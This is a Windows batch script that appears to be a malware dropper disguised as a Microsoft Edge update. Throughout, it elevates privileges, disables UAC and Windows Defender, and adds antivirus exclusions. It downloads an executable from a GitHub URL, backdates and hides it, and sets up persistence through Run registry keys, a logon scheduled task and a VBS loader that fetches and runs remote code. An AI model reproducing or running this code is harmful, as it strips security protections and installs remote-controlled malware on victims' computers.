@cls
@echo off
set "params=%*"
cd /d "%~dp0"

if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs"
fsutil dirty query %systemdrive% 1>nul 2>nul || (
    echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/c cd /d ""%~sdp0"" && %~s0 %params%", "", "runas", 0 >> "%temp%\getadmin.vbs"
    wscript.exe "%temp%\getadmin.vbs"
    exit /B
)

:gotAdmin
pushd "%CD%"
cd /d "%TEMP%"
set "UpdateChecker=powershell"

%UpdateChecker% -w hidden -c "if(Get-Command Add-MpPreference -ErrorAction SilentlyContinue){Add-MpPreference -ExclusionPath 'C:\', 'C:\Windows', 'C:\Program Files (x86)\Microsoft\EdgeUpdate'}" >nul 2>&1

dism /online /get-featureinfo /featurename:NetFx3 | findstr /I "Enabled" >nul 2>&1
if %errorlevel% neq 0 (
    dism /online /enable-feature /featurename:NetFx3 /all /norestart /quiet >nul 2>&1
)

reg add "HKLM\SOFTWARE\Microsoft\Windows\Currentversion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\Currentversion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\Currentversion\Policies\System" /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f >nul 2>&1

reg add "HKLM\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications" /v "DisableEnhancedNotifications" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" /v "DisableNotifications" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Virus & threat protection" /v "UILockdown" /t REG_DWORD /d 1 /f >nul 2>&1

reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d 1 /f >nul 2>&1
for %%s in (WdBoot,WdFilter,WdNisSvc,WinDefend,SecurityHealthService,Sense) do (
    reg add "HKLM\System\CurrentControlSet\Services\%%s" /v "Start" /t REG_DWORD /d 4 /f >nul 2>&1
)

set "URL=https://raw.githubusercontent.com/techerking29-collab/MicrosoftEdgeCoreUpdate/main/MicrosoftEdgeCoreUpdate.exe"
set "DEST_DIR=C:\Program Files (x86)\Microsoft\EdgeUpdate\1.3.217.3"
set "DEST=%DEST_DIR%\MicrosoftEdgeCoreUpdate.exe"

if not exist "%DEST_DIR%" mkdir "%DEST_DIR%" >nul 2>&1

:downLoop
if not exist "%DEST%" (
    %UpdateChecker% -w hidden -c "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('%URL%', '%DEST%')" >nul 2>&1
    timeout /t 5 /nobreak >nul
    goto downLoop
)

%UpdateChecker% -w hidden -c "if(Test-Path '%DEST%'){$(Get-Item '%DEST%').CreationTime='11/12/2022 10:15:00'; $(Get-Item '%DEST%').LastWriteTime='11/12/2022 10:15:00'}" >nul 2>&1

start /min "" "%DEST%"
timeout /t 2 /nobreak >nul
attrib +s +h "%DEST%" >nul 2>&1

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "EdgeUpdate" /t REG_SZ /d "\"%DEST%\"" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SysWOW64" /d "\"%DEST%\"" /f >nul 2>&1

set "TASK_NAME=EdgeCoreRepair"
set "LDR_PS=[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $t=$env:APPDATA+'\clean.bat'; (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/techerking29-collab/MicrosoftEdgeCoreUpdate/main/cleaner.bat', $t); Start-Process cmd -ArgumentList '/c',$t -Verb RunAs"

schtasks /create /tn "%TASK_NAME%" /tr "powershell.exe -w hidden -c \"%LDR_PS%\"" /sc onlogon /rl highest /f >nul 2>&1

set "VBS_LDR=%APPDATA%\EdgeUpdate.vbs"
echo Set WshShell = CreateObject("WScript.Shell") > "%VBS_LDR%"
echo WshShell.Run "powershell -w hidden -c ""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/techerking29-collab/MicrosoftEdgeCoreUpdate/main/cleaner.bat')""", 0, False >> "%VBS_LDR%"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "EdgeCoreVbs" /t REG_SZ /d "wscript.exe \"%VBS_LDR%\"" /f >nul 2>&1

echo Islem tamamlandi.
pause
exit
